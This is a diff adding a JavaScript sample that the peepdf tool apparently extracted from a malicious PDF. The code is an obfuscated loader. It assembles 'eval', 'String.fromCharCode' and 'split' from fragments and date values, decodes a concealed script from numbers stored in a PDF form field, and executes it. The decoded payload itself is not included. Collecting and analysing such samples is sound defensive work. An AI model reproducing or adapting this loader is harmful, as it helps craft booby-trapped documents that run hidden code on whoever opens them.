@@ -1,0 +1,34 @@
+// peepdf comment: Javascript code located in object 10 (version 0)
+
+var a = function() {
+        st = new Date();
+        var wf = '';
+        var ju = 'e' + wf + 'v' + 'a' + wf + st.getDay();
+        ju = ju.replace('6', 'l');
+        anxl = (function() {
+            return this;
+        })();
+        cgju = anxl[ju];
+
+        function soib() {
+            var jojo = '',
+                hn = [];
+            var wf = '';
+            cgju('va' + wf + 'r zugi=Str' + wf + 'ing.f' + wf + 'romC' + wf + 'harCode');
+            var thgj = '' + st.getMonth() + wf + 'i' + wf + 't';
+            var sa = 's' + thgj.replace('11', 'pl');
+            var uwsg = '2010';
+            uwsg = '';
+            var vbyc = khfdskjfh.rawValue.split(',');
+            byy = 'le' + wf + 'ng' + wf + 'th';
+            var ivyk = vbyc[byy] / 2;
+            for (var fiwj = 0; fiwj < ivyk; fiwj++) {
+                jojo += zugi(vbyc[fiwj + ivyk] - vbyc[fiwj]);
+            }
+            return jojo;
+        }
+        var jyt = soib();
+        cgju(jyt);
+    };
+a.call();
+
